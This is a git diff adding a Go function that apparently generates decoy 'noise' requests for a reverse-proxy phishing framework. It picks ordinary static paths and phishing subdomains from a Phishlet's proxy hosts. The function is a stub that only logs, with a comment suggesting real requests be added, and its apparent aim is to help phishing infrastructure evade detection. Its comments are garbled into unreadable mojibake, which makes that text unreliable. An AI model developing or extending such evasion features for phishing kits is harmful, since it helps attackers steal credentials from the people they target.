[32m+[m[32mfunc generateNoiseRequest(pl *Phishlet, phishDomain string) {[m
[32m+[m[32m    seed := make([]byte, 1)[m
[32m+[m[32m    rand.Read(seed)[m
[32m+[m[41m    [m
[32m+[m[32m    // 30% —à–∞–Ω—Å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —à—É–º–æ–≤–æ–π –∑–∞–ø—Ä–æ—Å[m
[32m+[m[32m    if int(seed[0])%10 < 3 {[m
[32m+[m[32m        noisePaths := []string{[m
[32m+[m[32m            "/favicon.ico",[m
[32m+[m[32m            "/robots.txt",[m
[32m+[m[32m            "/sitemap.xml",[m
[32m+[m[32m            "/manifest.json",[m
[32m+[m[32m            "/apple-touch-icon.png",[m
[32m+[m[32m            "/browserconfig.xml",[m
[32m+[m[32m        }[m
[32m+[m[41m        [m
[32m+[m[32m        pathIndex := int(seed[0]) % len(noisePaths)[m
[32m+[m[32m        noisePath := noisePaths[pathIndex][m
[32m+[m[41m        [m
[32m+[m[32m        // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –¥–æ–º–µ–Ω[m
[32m+[m[32m        if len(pl.proxyHosts) > 0 {[m
[32m+[m[32m            hostIndex := int(seed[0]) % len(pl.proxyHosts)[m
[32m+[m[32m            ph := pl.proxyHosts[hostIndex][m
[32m+[m[32m            fakeHost := combineHost(ph.phish_subdomain, phishDomain)[m
[32m+[m[41m            [m
[32m+[m[32m            // –°–æ–∑–¥–∞–µ–º —Ñ–µ–π–∫–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –≤ —Ñ–æ–Ω–µ[m
[32m+[m[32m            go func() {[m
[32m+[m[32m                time.Sleep(time.Duration(100+int(seed[0])%500) * time.Millisecond)[m
[32m+[m[41m                [m
[32m+[m[32m                // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —Ä–µ–∞–ª—å–Ω—ã–π HTTP –∑–∞–ø—Ä–æ—Å –¥–ª—è —à—É–º–∞[m
[32m+[m[32m                log.Debug("Generated noise request to %s%s", fakeHost, noisePath)[m
[32m+[m[32m            }()[m
[32m+[m[32m        }[m
[32m+[m[32m    }[m
[32m+[m[32m}[m
